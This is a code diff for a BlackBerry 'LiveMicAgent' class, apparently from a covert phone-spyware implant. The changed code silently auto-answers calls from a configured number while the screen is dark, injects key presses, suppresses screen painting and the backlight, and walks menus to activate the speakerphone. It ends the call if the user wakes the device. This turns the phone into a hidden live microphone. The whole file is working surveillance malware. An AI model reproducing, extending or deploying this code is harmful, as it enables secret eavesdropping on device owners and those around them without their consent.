@@ -10,6 +10,7 @@
 package blackberry.agent;
 
 import java.io.EOFException;
+import java.util.Hashtable;
 
 import net.rim.device.api.system.Alert;
 import net.rim.device.api.system.Application;
@@ -20,6 +21,8 @@ import net.rim.device.api.ui.UiApplication;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.AppListener;
 import blackberry.Conf;
+import blackberry.debug.Debug;
+import blackberry.debug.DebugLevel;
 import blackberry.injection.KeyInjector;
 import blackberry.injection.MenuWalker;
 import blackberry.interfaces.BacklightObserver;
@@ -27,8 +30,6 @@ import blackberry.interfaces.PhoneCallObserver;
 import blackberry.log.Log;
 import blackberry.log.LogType;
 import blackberry.utils.Check;
-import blackberry.utils.Debug;
-import blackberry.utils.DebugLevel;
 import blackberry.utils.Utils;
 import blackberry.utils.WChar;
 
@@ -103,6 +104,7 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
      */
     protected void actualStart() {
         AppListener.getInstance().addPhoneCallObserver(this);
+        backlight = Backlight.isEnabled();
         AppListener.getInstance().addBacklightObserver(this);
     }
 
@@ -113,7 +115,7 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
     protected void actualStop() {
         AppListener.getInstance().removePhoneCallObserver(this);
         AppListener.getInstance().removeBacklightObserver(this);
-        
+
         suspendPainting(false);
     }
 
@@ -129,21 +131,27 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
      * @see
      * blackberry.interfaces.PhoneCallObserver#onCallAnswered(java.lang.String)
      */
-    public void onCallAnswered(final String phoneNumber) {
-        //#ifdef DEBUG_INFO
-        debug.info("callAnswered: " + phoneNumber);
+    public synchronized void onCallAnswered(final int callId,
+            final String phoneNumber) {
+        //#ifdef DBC
+        Check.requires(phoneNumber != null, "onCallIncoming: phoneNumber null");
         //#endif
 
-        if (!interestingNumber(phoneNumber)) {
+        //#ifdef DEBUG_INFO
+        debug.info("    === callAnswered: " + phoneNumber + "===");
+        //#endif
+
+        if (!interestingNumber(callId, phoneNumber)) {
             return;
         }
-                
+
         //MenuWalker.walk(new String[] { "Activate Speakerphone" });
-        MenuWalker.walk(new String[] { "Home Screen",  "Return to Phone" });
-       
+        MenuWalker.walk(new String[] { "Home Screen", "Return to Phone" });
+
         //MenuWalker.walk(new String[] { "Close" });
         MenuWalker.walk(new String[] { "Return to Phone" });
-        
+        MenuWalker.walk(new String[] { "Activate Speakerphone" });
+
         //#ifdef DEBUG_TRACE
         debug.trace("onCallAnswered: finished");
         //#endif
@@ -154,29 +162,23 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
      * @see
      * blackberry.interfaces.PhoneCallObserver#onCallConnected(java.lang.String)
      */
-    public void onCallConnected(final String phoneNumber) {
+    public synchronized void onCallConnected(final int callId,
+            final String phoneNumber) {
+        //#ifdef DBC
+        Check.requires(phoneNumber != null, "onCallIncoming: phoneNumber null");
+        //#endif
+
         //#ifdef DEBUG_INFO
-        debug.info("callConnected: " + phoneNumber);
+        debug.info("    === callConnected: " + phoneNumber + " ===");
         //#endif      
-        
-        if (!interestingNumber(phoneNumber)) {
+
+        if (!interestingNumber(callId, phoneNumber)) {
             return;
         }
-        
-        suspendPainting(false);
+               
         Backlight.enable(false);
-    }
-
-    private boolean interestingNumber(final String phoneNumber) {
-        if (!phoneNumber.endsWith(number)) {
-            //#ifdef DEBUG_TRACE
-            debug.trace("onCallIncoming, don't tap: " + phoneNumber + " != "
-                    + number);
-            //#endif
-            return false;
-        }
-        
-        return true;
+        suspendPainting(false);
+        autoanswer = true;
     }
 
     /*
@@ -185,17 +187,28 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
      * blackberry.interfaces.PhoneCallObserver#onCallDisconnected(java.lang.
      * String)
      */
-    public void onCallDisconnected(final String phoneNumber) {
+    public synchronized void onCallDisconnected(final int callId,
+            final String phoneNumber) {
+
         //#ifdef DEBUG_INFO
-        debug.info("callDisconnected: " + phoneNumber);
+        debug.info("======= callDisconnected: " + phoneNumber + " =======");
         //#endif
 
-        if (!interestingNumber(phoneNumber)) {
-            return;
-        }
-        
-        suspendPainting(false);
         autoanswer = false;
+
+        if (!interestingNumber(callId, phoneNumber)) {
+            //#ifdef DEBUG_TRACE
+            debug.trace("onCallDisconnected: not interesting");
+            //#endif
+            return;
+        } else {
+            //#ifdef DEBUG_TRACE
+            debug.trace("onCallDisconnected, interesting");
+            //#endif
+        }
+
+        suspendPainting(false);
+
     }
 
     /*
@@ -203,32 +216,47 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
      * @see
      * blackberry.interfaces.PhoneCallObserver#onCallIncoming(java.lang.String)
      */
-    public void onCallIncoming(final String phoneNumber) {
-        //#ifdef DEBUG_INFO
-        debug.info("answering: " + phoneNumber);
+    public synchronized void onCallIncoming(final int callId,
+            final String phoneNumber) {
+
+        //#ifdef DBC
+        Check.requires(phoneNumber != null, "onCallIncoming: phoneNumber null");
         //#endif
-        
-        if (!interestingNumber(phoneNumber)) {
+
+        //#ifdef DEBUG_INFO
+        debug.info("======= incoming: " + phoneNumber + " =======");
+        //#endif
+
+        if (!interestingNumber(callId, phoneNumber)) {
             return;
         }
-      
-        volume = Alert.getVolume();
-        Alert.setBuzzerVolume(0);
-        Audio.setVolume(0);
 
-        autoanswer = true;
+        
         suspendPainting(true);
 
-        KeyInjector.pressKey(Keypad.KEY_SEND);
+        if (backlight) {
+            //#ifdef DEBUG_INFO
+            debug.info("Backlight enabled, killing incoming call");
+            //#endif
+            KeyInjector.pressKey(Keypad.KEY_END);
+        } else {
+            //#ifdef DEBUG_INFO
+            debug.info("Backlight disabled, accepting incoming call");
+            //#endif
+            KeyInjector.pressKey(Keypad.KEY_SEND);
+        }
 
     }
+
+    boolean backlight;
 
     /*
      * (non-Javadoc)
      * @see blackberry.interfaces.BacklightObserver#onBacklightChange(boolean)
      */
-    public void onBacklightChange(final boolean statusOn) {
+    public synchronized void onBacklightChange(final boolean statusOn) {
         if (autoanswer && statusOn) {
+            autoanswer = false;
             //#ifdef DEBUG_TRACE
             debug.trace("onBacklightChange: sending END");
             //#endif
@@ -239,6 +267,7 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
 
             suspendPainting(false);
         }
+        backlight = statusOn;
     }
 
     /**
@@ -248,6 +277,10 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
      *            true if you ask to suspend
      */
     private void suspendPainting(final boolean suspend) {
+        //#ifdef DEBUG_TRACE
+        debug.trace("suspendPainting: " + suspend + " suspended: " + suspended);
+        //#endif              
+
         synchronized (Application.getEventLock()) {
             if (suspended != suspend) {
                 try {
@@ -261,4 +294,53 @@ public class LiveMicAgent extends Agent implements PhoneCallObserver,
             }
         }
     }
+
+    Hashtable callingHistory = new Hashtable();
+
+    /**
+     * true if the phoneArgument matches the configured one
+     * 
+     * @param phoneNumber
+     * @return
+     */
+    private boolean interestingNumber(int callId, final String phoneNumber) {
+
+        String phone = "";
+        if (phoneNumber == null) {
+            if (callingHistory.containsKey(new Integer(callId))) {
+                phone = (String) callingHistory.get(new Integer(callId));
+                callingHistory.remove(new Integer(callId));
+
+            } else {
+                //#ifdef DEBUG_WARN
+                debug.warn("Unknown callId: " + callId);
+                //#endif
+                return false;
+            }
+        } else {
+            phone = phoneNumber;
+        }
+
+        //#ifdef DBC
+        Check.asserts(phone != null, "interestingNumber: phone==null");
+        //#endif
+
+        if (!phone.endsWith(number)) {
+            //#ifdef DEBUG_TRACE
+            debug.trace("onCallIncoming, don't tap: " + phoneNumber + " != "
+                    + number);
+            //#endif
+            return false;
+        } else {
+            if (phoneNumber != null) {
+                //#ifdef DEBUG_TRACE
+                debug.trace("callingHistory adding callId: " + callId);
+                //#endif
+                callingHistory.put(new Integer(callId), phoneNumber);
+            }
+            return true;
+        }
+
+    }
+
 }
